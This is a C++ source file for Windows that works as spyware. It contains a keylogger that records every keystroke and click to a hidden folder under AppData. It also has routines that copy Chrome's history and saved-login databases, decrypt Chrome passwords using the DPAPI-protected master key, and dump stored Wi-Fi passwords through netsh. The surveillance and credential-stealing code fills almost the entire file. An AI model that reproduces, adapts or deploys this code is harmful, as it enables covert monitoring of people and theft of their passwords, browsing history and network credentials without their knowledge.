#include <iostream>
#include <windows.h>
#include <fstream>
#include <sys/stat.h>
#include "sqlite/sqlite3.h"
#include <cstdlib>
#include <winsock.h>
#include <thread>
#include <ctime>
#include <chrono>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>
#include <sstream>
#include <Wincrypt.h>
#include <rapidjson/document.h>
#include <openssl/evp.h>
#include <wtypes.h>
#include <iomanip>
#include <vector>

using namespace std;
using namespace rapidjson;

#define CHROME_INTERVAL_CHECK_VALUE 5   //Number of minutes between chrome history interval checks

int flag_history_init_run = 1;
bool capslock_pressed = false;

string g_key_press_logfile;
string g_chrome_history_logfile;
string g_chrome_last_time_logfile;
string g_chrome_passwd_logfile;
string g_chrome_data_dir;

string g_last_history_time = "01-01-1970 00:00:00"; 
string g_hostname;
string g_username;
string g_local_key;

string base64_decode(string const& encoded_string)
{
    vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i]] = i;
    string decoded_string;
    int val = 0, valb = -8;
    for (unsigned char c : encoded_string) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            decoded_string.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return decoded_string;
}


string exec(const char* cmd) {
    array<char, 1000> buffer;
    string result;
    unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        throw runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}


bool file_exists(string filename) {
    std::string const temp{filename};
    const char* dir = temp.c_str();
    struct stat info;
    if( stat(dir, &info ) != 0 )
        return false;
    return true;
}


void printHexadecimal(const std::string& str) {
    for (char c : str)
    {
        std::cout << "0x" << std::setfill('0') << std::setw(2) << std::hex << (int)c << " ";
    }
    std::cout << std::endl;
}


void save_in_file(string filename, string msg) {
    ofstream myfile;
    myfile.open(filename, ios_base::app);
    myfile << msg ;
    myfile.close();
}


void format_keys(int key_num, string key_opt_1, string key_opt_2) {
    string printed_string;

    // Getting stats of current key press
    bool isAlpha = (key_num >= 65 and key_num <= 90) ? true : false;
    bool isAlphaNumeric =  ((key_num >= 48 and key_num <= 57) || isAlpha) ? true : false;
    bool isGrammer =  ((key_num == 32) || (key_num >= 186 and key_num <= 226) || isAlphaNumeric) ? true : false;

    // Changing key press value depending upon shift and caps lock state
    bool shift_pressed = ((GetKeyState( VK_SHIFT ) & 0x8000) != 0) ? true : false;
    bool cl_pressed = ((GetKeyState( VK_CAPITAL ) & 0x8000) != 0) ? true : false;
    
    // Changing capslock's current state based on current capslock key press
    if (cl_pressed) capslock_pressed = (capslock_pressed) ? false : true;
    
    if (isAlpha and capslock_pressed) shift_pressed = true;
    printed_string = (shift_pressed) ? key_opt_2 : key_opt_1;
    
    // Skip printing ship and caps lock key presses
    if (key_num == 16 || key_num == 20) {
        return;
    }

    // Formatting key press value for log file
    printed_string = (isGrammer) ? printed_string : "\n" + printed_string + "\n";
    save_in_file(g_key_press_logfile, printed_string);
}


int detect_key_press() {
    cout << "Startign Key Press Detection" << endl;
    while(1)
    {
        this_thread::sleep_for(std::chrono::milliseconds(5));
        for (int i = 0; i < 256; i++) {
            if (GetAsyncKeyState(i) & 0x0001) {
                string key_opt_1;
                string key_opt_2;
                // Mapping key press value to human readable states
                if      (i == 1) {key_opt_1 = "<Mouse Left>"; key_opt_2 = "<Mouse Left>";}
                else if (i == 2) {key_opt_1 = "<Mosue Right>"; key_opt_2 = "<Mosue Right>";}  
                else if (i == 3) {key_opt_1 = "<Control-break>"; key_opt_2 = "<Control-break>";} 
                else if (i == 4) {key_opt_1 = "<Mouse Middle>"; key_opt_2 = "<Mouse Middle>";}  
                else if (i == 5) {key_opt_1 = "Mouse Forward Btn"; key_opt_2 = "Mouse Forward Btn";}  
                else if (i == 6) {key_opt_1 = "Mouse Backward Btn"; key_opt_2 = "Mouse Backward Btn";}  
                else if (i == 8) {key_opt_1 = "<BACKSPACE>"; key_opt_2 = "<BACKSPACE>";}  
                else if (i == 9) {key_opt_1 = "<TAB>"; key_opt_2 = "<TAB>";}  
                else if (i == 12) {key_opt_1 = "<CLEAR>"; key_opt_2 = "<CLEAR>";}  
                else if (i == 13) {key_opt_1 = "<ENTER>"; key_opt_2 = "<ENTER>";}  
                else if (i == 16) {key_opt_1 = "<SHIFT>"; key_opt_2 = "<SHIFT>";} 
                else if (i == 17) {key_opt_1 = "<CTRL>"; key_opt_2 = "<CTRL>";}  
                else if (i == 18) {key_opt_1 = "<ALT>"; key_opt_2 = "<ALT>";}  
                else if (i == 19) {key_opt_1 = "<PAUSE>"; key_opt_2 = "<PAUSE>";} 
                else if (i == 20) {key_opt_1 = "<CAPS>"; key_opt_2 = "<CAPS>";}  
                else if (i == 27) {key_opt_1 = "<ESC>"; key_opt_2 = "<ESC>";}  
                else if (i == 32) {key_opt_1 = " "; key_opt_2 = " ";}  
                else if (i == 33) {key_opt_1 = "Page Up"; key_opt_2 = "Page Up";}  
                else if (i == 34) {key_opt_1 = "Page Dow"; key_opt_2 = "Page Dow";}  
                else if (i == 35) {key_opt_1 = "<END>"; key_opt_2 = "<END>";}  
                else if (i == 36) {key_opt_1 = "<HOME>"; key_opt_2 = "<HOME>";} 
                else if (i == 37) {key_opt_1 = "<LEFT>"; key_opt_2 = "<LEFT>";}  
                else if (i == 38) {key_opt_1 = "<UP>"; key_opt_2 = "<UP>";}  
                else if (i == 39) {key_opt_1 = "<RIGHT>"; key_opt_2 = "<RIGHT>";}  
                else if (i == 40) {key_opt_1 = "<DOWN>"; key_opt_2 = "<DOWN>";}  
                else if (i == 41) {key_opt_1 = "<SELECT>"; key_opt_2 = "<SELECT>";}  
                else if (i == 42) {key_opt_1 = "<PRINT>"; key_opt_2 = "<PRINT>";}  
                else if (i == 43) {key_opt_1 = "<EXECUTE>"; key_opt_2 = "<EXECUTE>";}  
                else if (i == 44) {key_opt_1 = "<PRINT>"; key_opt_2 = "<PRINT>";} 
                else if (i == 45) {key_opt_1 = "<INS>"; key_opt_2 = "<INS>";} 
                else if (i == 46) {key_opt_1 = "<DEL>"; key_opt_2 = "<DEL>";}
                else if (i == 47) {key_opt_1 = "<HELP>"; key_opt_2 = "<HELP>";}  
                else if (i == 48) {key_opt_1 = "0"; key_opt_2 = ")";}
                else if (i == 49) {key_opt_1 = "1"; key_opt_2 = "!";}
                else if (i == 50) {key_opt_1 = "2"; key_opt_2 = "@";}
                else if (i == 51) {key_opt_1 = "3"; key_opt_2 = "#";}
                else if (i == 52) {key_opt_1 = "4"; key_opt_2 = "$";}
                else if (i == 53) {key_opt_1 = "5"; key_opt_2 = "%";}
                else if (i == 54) {key_opt_1 = "6"; key_opt_2 = "^";}
                else if (i == 55) {key_opt_1 = "7"; key_opt_2 = "&";}
                else if (i == 56) {key_opt_1 = "8"; key_opt_2 = "*";}
                else if (i == 57) {key_opt_1 = "9"; key_opt_2 = "(";}
                else if (i == 65) {key_opt_1 = "a"; key_opt_2 = "A";}
                else if (i == 66) {key_opt_1 = "b"; key_opt_2 = "B";}
                else if (i == 67) {key_opt_1 = "c"; key_opt_2 = "C";}
                else if (i == 68) {key_opt_1 = "d"; key_opt_2 = "D";}
                else if (i == 69) {key_opt_1 = "e"; key_opt_2 = "E";}
                else if (i == 70) {key_opt_1 = "f"; key_opt_2 = "F";}
                else if (i == 71) {key_opt_1 = "g"; key_opt_2 = "G";}
                else if (i == 72) {key_opt_1 = "h"; key_opt_2 = "H";}
                else if (i == 73) {key_opt_1 = "i"; key_opt_2 = "I";}
                else if (i == 74) {key_opt_1 = "j"; key_opt_2 = "J";}
                else if (i == 75) {key_opt_1 = "k"; key_opt_2 = "K";}
                else if (i == 76) {key_opt_1 = "l"; key_opt_2 = "L";}
                else if (i == 77) {key_opt_1 = "m"; key_opt_2 = "M";}
                else if (i == 78) {key_opt_1 = "n"; key_opt_2 = "N";}
                else if (i == 79) {key_opt_1 = "o"; key_opt_2 = "O";}
                else if (i == 80) {key_opt_1 = "p"; key_opt_2 = "P";}
                else if (i == 81) {key_opt_1 = "q"; key_opt_2 = "Q";}
                else if (i == 82) {key_opt_1 = "r"; key_opt_2 = "R";}
                else if (i == 83) {key_opt_1 = "s"; key_opt_2 = "S";}
                else if (i == 84) {key_opt_1 = "t"; key_opt_2 = "T";}
                else if (i == 85) {key_opt_1 = "u"; key_opt_2 = "U";}
                else if (i == 86) {key_opt_1 = "v"; key_opt_2 = "V";}
                else if (i == 87) {key_opt_1 = "w"; key_opt_2 = "W";}
                else if (i == 88) {key_opt_1 = "x"; key_opt_2 = "X";}
                else if (i == 89) {key_opt_1 = "y"; key_opt_2 = "Y";}
                else if (i == 90) {key_opt_1 = "z"; key_opt_2 = "Z";}
                else if (i == 91) {key_opt_1 = "<Left>"; key_opt_2 = "<Left>";}  
                else if (i == 92) {key_opt_1 = "<Right>"; key_opt_2 = "<Right>";} 
                else if (i == 93) {key_opt_1 = "<Applications>"; key_opt_2 = "<Applications>";} 
                else if (i == 94) {key_opt_1 = "<Reserved>"; key_opt_2 = "<Reserved>";} 
                else if (i == 95) {key_opt_1 = "<Computer>"; key_opt_2 = "<Computer>";} 
                else if (i == 106) {key_opt_1 = "<Multiply>"; key_opt_2 = "<Multiply>";} 
                else if (i == 107) {key_opt_1 = "<Add>"; key_opt_2 = "<Add>";} 
                else if (i == 108) {key_opt_1 = "<Separator>"; key_opt_2 = "<Separator>";} 
                else if (i == 109) {key_opt_1 = "<Subtract>"; key_opt_2 = "<Subtract>";}
                else if (i == 110) {key_opt_1 = "<Decimal>"; key_opt_2 = "<Decimal>";} 
                else if (i == 111) {key_opt_1 = "<Divide>"; key_opt_2 = "<Divide>";} 

                else if (i == 144) printf("<NUM>");
                else if (i == 145) printf("<SCROLL>");
                else if (i == 172) printf("Home");
                else if (i == 173) printf("<Volume Mute>");
                else if (i == 174) printf("<Volume Down>");
                else if (i == 175) printf("<Volume Up>");
                else if (i == 176) printf("<Next>");
                else if (i == 177) printf("<Previous>");
                else if (i == 178) printf("<Stop>");
                else if (i == 179) printf("<Play/Pause>");
                else if (i == 180) printf("<Start>");
                else if (i == 181) printf("<Select>");
                else if (i == 182) printf("<Start>");
                else if (i == 183) printf("<Start>");
                else if (i == 186) {key_opt_1 = ";"; key_opt_2 = ":";} 
                else if (i == 187) {key_opt_1 = "="; key_opt_2 = "+";}  
                else if (i == 188) {key_opt_1 = ","; key_opt_2 = "<";}
                else if (i == 189) {key_opt_1 = "-"; key_opt_2 = "_";} 
                else if (i == 190) {key_opt_1 = "."; key_opt_2 = ">";}
                else if (i == 191) {key_opt_1 = "/"; key_opt_2 = "?";}
                else if (i == 192) {key_opt_1 = "`"; key_opt_2 = "~";}
                else if (i == 219) {key_opt_1 = "["; key_opt_2 = "{";}
                else if (i == 220) {key_opt_1 = "\\"; key_opt_2 = "|";}
                else if (i == 221) {key_opt_1 = "]"; key_opt_2 = "}";}
                else if (i == 222) {key_opt_1 = "\'"; key_opt_2 = "\"";}
                else if (i == 223) {key_opt_1 = "<Used>"; key_opt_2 = "<Used>";}
                else if (i == 224) {key_opt_1 = "<Reserved>"; key_opt_2 = "<Reserved>";}
                else if (i == 226) {key_opt_1 = ","; key_opt_2 = "<";}
                else if (i == 229) {key_opt_1 = "<IME>"; key_opt_2 = "<IME>";}
                else if (i == 231) {key_opt_1 = "<Used>"; key_opt_2 = "<Used>";}
                else if (i == 246) {key_opt_1 = "<Attn>"; key_opt_2 = "<Attn>";}
                else if (i == 247) {key_opt_1 = "<CrSel>"; key_opt_2 = "<CrSel>";}
                else if (i == 248) {key_opt_1 = "<ExSel>"; key_opt_2 = "<ExSel>";}
                else if (i == 249) {key_opt_1 = "<Erase>"; key_opt_2 = "<Erase>";}
                else if (i == 250) {key_opt_1 = "<Play>"; key_opt_2 = "<Play>";}
                else if (i == 251) {key_opt_1 = "<Zoom>"; key_opt_2 = "<Zoom>";}
                else if (i == 252) {key_opt_1 = "<Reserved>"; key_opt_2 = "<Reserved>";}
                else if (i == 253) {key_opt_1 = "<PA1>"; key_opt_2 = "<PA1>";}
                else if (i == 254) {key_opt_1 = "<Clear>"; key_opt_2 = "<Clear>";}
                format_keys(i, key_opt_1, key_opt_2);
            } 
        } 
    }
}


bool db_query(string input_db_file, string output_log_file, string sql_query, int(*func)(void *, int, char **, char **)) {
    // Copying database to new file to bypass database lock
    string copy_db = input_db_file + "2";
    string formatted_cmd = "copy \""+input_db_file+"\"  \""+copy_db+"\"";
    
    int result = system(formatted_cmd.c_str());
    if (result != 0) {
        cout << "There was an error executing the command." << endl;
        return false;
    }

    const char* data_path = copy_db.c_str();
    const char* data_log = output_log_file.c_str();
    sqlite3* db; 
    sqlite3_stmt* stmt;
    char *err;
    sqlite3_open(data_path, &db);
    int retval = sqlite3_exec(db, sql_query.c_str(), func, (void *)data_log, &err);
    if (retval != SQLITE_OK) {
        cout << "SQL EXEC ERROR" << err << endl;
        return false;
    }
    
    sqlite3_free(err);
    sqlite3_close(db);
    formatted_cmd = "del /f \""+copy_db+"\"";
    system(formatted_cmd.c_str());
    return true;
}


long int convert_datetime_to_epoch(string datetime) {
    int delim = datetime.find(" ");
    string date = datetime.substr(0, delim);
    string time = datetime.substr(delim, datetime.length());

    char *date_token = strtok((char*)date.c_str(), "-");
    tm dt_conversion{};
    for (int i = 0; i < 3; i++) {
        string t = string(date_token);

        switch (i) {
              case 0: dt_conversion.tm_year = stoi(t) - 1900; break;
              case 1: dt_conversion.tm_mon = stoi(t) -1; break; 
              case 2: dt_conversion.tm_mday = stoi(t); break;
        }
        date_token = strtok(NULL, "-");
    }

    char *time_token = strtok((char*)time.c_str(), ":");
    for (int i = 0; i < 3; i++) {
        string t = string(time_token);
        switch (i) {
              case 0: dt_conversion.tm_hour = stoi(t); break;
              case 1: dt_conversion.tm_min = stoi(t); break;
              case 2: dt_conversion.tm_sec = stoi(t); break;
        }
        time_token = strtok(NULL, ":");
    }
    
    time_t epoch_time = mktime(&dt_conversion);
    long int returned_time = static_cast<long int> (epoch_time);
    return returned_time;
}


static int sql_chrome_history_to_file(void *filename, int argc, char **argv, char **azColName){
    ofstream myfile;
    myfile.open((const char*)filename, ios_base::app);
    string output = "";
    for(int i = 0; i < argc; i++){           
        // Skipping over previously recorded chrome history
        if (string(azColName[i]) == "time") {
            long int current_history_epoch = convert_datetime_to_epoch(string(argv[i]));
            long int last_history_epoch = convert_datetime_to_epoch(g_last_history_time);
            if (current_history_epoch > last_history_epoch)
                g_last_history_time = string(argv[i]); 
            else
                if (!flag_history_init_run)
                    return 0;

        }
       output += (argv[i] ? argv[i] : "NULL");
       output += "\t\t";
    }
    myfile << output + "\n";
    myfile.close();
    return 0;
}


bool get_chrome_history() {
    string chrome_passwd_file_path = g_chrome_data_dir + "Default\\";
    string original_db = chrome_passwd_file_path+ "History";
    bool retval = db_query(original_db, g_chrome_history_logfile, "SELECT datetime((last_visit_time/1000000)-11644473600, 'unixepoch', 'localtime') AS time, title, url FROM urls;", &sql_chrome_history_to_file);
    return retval;
}


int chrome_interval_check() {
    // Check for logfile
    if (!file_exists(g_chrome_last_time_logfile)) {
        ofstream output(g_chrome_last_time_logfile);
    } else {
        // Storing last time log file contents to global last file time
        string temp;
        ifstream last_time_file(g_chrome_last_time_logfile);
        while (getline(last_time_file, temp))
            g_last_history_time = temp;
        last_time_file.close(); 
        cout << g_last_history_time << endl;   
    }
    // Get the current time
    auto start_time = std::chrono::system_clock::now();
    get_chrome_history();
    flag_history_init_run = 0;
    while (true) {
        // Periodically getting Chrome history
        auto current_time = std::chrono::system_clock::now();
        auto diff = current_time - start_time;
        int diff_value = std::chrono::duration_cast<std::chrono::seconds>(diff).count();
        std::this_thread::sleep_for(std::chrono::seconds(1));
        if (diff_value >= CHROME_INTERVAL_CHECK_VALUE*60) {
                try {get_chrome_history();} catch (...) {}                
                start_time = std::chrono::system_clock::now();
                // Updating last chrome history time file
                fstream ofs;
                ofs.open(g_chrome_last_time_logfile, ios::out | ios::trunc);
                ofs << g_last_history_time;
                ofs.close();
            }
    }

    return 0;
}


std::string encrypt_CryptProtectData(const std::string& input)
{
    DATA_BLOB inputBlob;
    inputBlob.pbData = (BYTE*)input.c_str();
    inputBlob.cbData = input.size();

    DATA_BLOB outputBlob;
    BOOL result = CryptProtectData(&inputBlob, L"", NULL, NULL, NULL, 0, &outputBlob);

    if (!result)
    {
        std::cerr << "Error: CryptProtectData failed with error code " << GetLastError() << std::endl;
        return std::string();
    }

    std::string output((char*)outputBlob.pbData, outputBlob.cbData);
    LocalFree(outputBlob.pbData);
    return output;
}


string decrypt_CryptUnprotectData(const std::string& encrypted_data) {
    DATA_BLOB encrypted_blob;
    encrypted_blob.pbData = const_cast<BYTE*>(reinterpret_cast<const BYTE*>(encrypted_data.data()));
    encrypted_blob.cbData = encrypted_data.size();
    DATA_BLOB decrypted_blob;
    BOOL result = CryptUnprotectData(&encrypted_blob, NULL, NULL, NULL, NULL, CRYPTPROTECT_LOCAL_MACHINE, &decrypted_blob);

    if (!result) {
    // The function failed, check GetLastError() for more information
        cout << "CryptUnprotectData failed" << endl;
        throw std::runtime_error("CryptUnprotectData failed");
    } else {
    std::string decrypted_data(reinterpret_cast<char*>(decrypted_blob.pbData), decrypted_blob.cbData);
        // Free the memory allocated by CryptUnprotectData
        LocalFree(decrypted_blob.pbData);
        return decrypted_data;
    }
}


std::string decrypt_aes_256_gcm(const std::string& key, const std::string& iv, const std::string& ciphertext)
{
    // Create an EVP_CIPHER_CTX object
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();

    // Initialize the decryption operation
    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL))
    {
        cout << "Error initializing the decryption operation" << endl;

        return "";
    }

    // Set the key and IV
    if (1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, iv.size(), NULL))
    {
        
        cout << "Error setting the IV length" << endl;
        return "";
    }
    if (1 != EVP_DecryptInit_ex(ctx, NULL, NULL, (const unsigned char*)key.data(), (const unsigned char*)iv.data()))
    {
        cout << "Error setting the key and IV" << endl;
        return "";
    }

    // Decrypt the ciphertext
    std::vector<unsigned char> plaintext(ciphertext.size());
    int out_len;
    if (1 != EVP_DecryptUpdate(ctx, plaintext.data(), &out_len, (const unsigned char*)ciphertext.data(), ciphertext.size()))
    {
        // 
        cout << "Error during decryption" << endl;
        return "";
    }

    cout << plaintext.data() << endl;

    // Finalize the decryption
    if (1 != EVP_DecryptFinal_ex(ctx, plaintext.data() + out_len, &out_len))
    {
        // Error during finalization
        cout << "Error Finalize the decryption" << endl;
        return "";
    }

    // Release the EVP_CIPHER_CTX object
    EVP_CIPHER_CTX_free(ctx);

    // Return the decrypted plaintext as a string
    return std::string((char*)plaintext.data(), plaintext.size());
}


static int sql_chrome_passwords_to_file(void *filename, int argc, char **argv, char **azColName){
    ofstream myfile;
    myfile.open((const char*)filename, ios_base::app);

    string output = "";
    for(int i = 0; i < argc; i++){  
        if (string(azColName[i]) == "password_value") {
            try {
                string enc_password = string(argv[i]);
                cout << "enc_password: " << enc_password << endl;
                enc_password = enc_password.erase(0,3);
                cout << "enc_password:   >>" << enc_password<< endl; 
                string init_vector = enc_password.substr(3, 15);
                cout << "init_vector:    " << init_vector << endl; 
                string payload = enc_password.substr(15);
                cout << "payload:    " << payload << endl; 
                std::string decrypted_password = decrypt_aes_256_gcm(g_local_key, init_vector, payload);
                cout << "decrypted_password" << decrypted_password << endl; 
            } catch (...) {
                cout << "Fucke dit ip" << endl;
            }   

            // string plaintext_password = decrypt_password(string(argv[i]));
            // cout << "Plaintext: " << plaintext_password << "\n\n" << endl;
            //output += plaintext_password;
        } else {
            //cout << azColName[i] << "\t\t" << string(argv[i]) << endl;
            output += (argv[i] ? argv[i] : "NULL");
        }
        
       output += "\t\t";
    }
    myfile << output + "\n";
    myfile.close();
    cout << "\n\n" << endl;
    return 0;
}


string get_local_key() {
    string key_path = g_chrome_data_dir + "Local State";
    ifstream file(key_path);
    string contents((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
    file.close();

    Document d;
    d.Parse(contents.c_str());
    
    string encrypted_key = d["os_crypt"]["encrypted_key"].GetString();
    string decoded_encrypted_key = base64_decode(encrypted_key);
    decoded_encrypted_key.erase(0,5);
    std::string decrypted_data = decrypt_CryptUnprotectData(decoded_encrypted_key);
    return decrypted_data;
}


bool get_chrome_passwords() {
    string chrome_passwd_file_path = g_chrome_data_dir + "Default\\";
    string original_db = chrome_passwd_file_path+ "Login Data";
    bool retval = db_query(original_db, g_chrome_passwd_logfile, "SELECT action_url, username_value, password_value FROM logins;", &sql_chrome_passwords_to_file);
    return retval;
}


void get_computer_stats() {
    long unsigned int hostname_len = MAX_COMPUTERNAME_LENGTH + 1;
    long unsigned int username_len = 257;
    char hostname[hostname_len];    
    char username[username_len];
    GetComputerNameExA((COMPUTER_NAME_FORMAT)0, hostname, &hostname_len);
    GetUserNameA(username, &username_len);
    g_hostname = string(hostname);
    g_username = string(username);
}


void get_saved_ssids_and_passwords() {
    const char* get_all_profiles = "netsh wlan show profile | findstr /r /s /i /m /c:\"\\<Profile\\>\"";
    char *out = (char*)exec(get_all_profiles).c_str();
    std::stringstream ss(out);
    std::string to;
    if (out != NULL)
    {
        while(std::getline(ss,to,'\n')){
            try {
                string ssid = to.substr(to.find(" : ")+3, to.length());
                cout << ssid << endl;
                string get_profile_password = "netsh wlan show profile name=\"" + ssid + "\" key=clear | findstr \"Content\"";
                string out2 = exec(get_profile_password.c_str());
                string passwd = out2.substr(out2.find(" : ")+3, out2.length());    
                cout << ssid << "    " << passwd << endl;
            } catch (...) {

            }          
        }
    }
}


void setup_fs() {
    get_computer_stats();
    
    string log_dir = "C:\\Users\\"+g_username+"\\AppData\\Local\\Windows\\";
    const char* path = log_dir.c_str();
    int retval = mkdir(path);

    g_key_press_logfile = log_dir + "key.log";
    g_chrome_history_logfile = log_dir + "chrome_history.log";
    g_chrome_last_time_logfile = log_dir + "chrome_last_time.log";
    g_chrome_passwd_logfile = log_dir + "chrome_passwords.log";

    g_chrome_data_dir = "C:\\Users\\"+g_username+"\\AppData\\Local\\Google\\Chrome\\User Data\\";

    g_local_key = get_local_key();
}


int main() {
    setup_fs();
    //get_saved_ssids_and_passwords();

    // get_chrome_passwords();

    //thread th1(chrome_interval_check);
    thread th2(detect_key_press);
    //th1.join();
    th2.join();
    return 1;
}
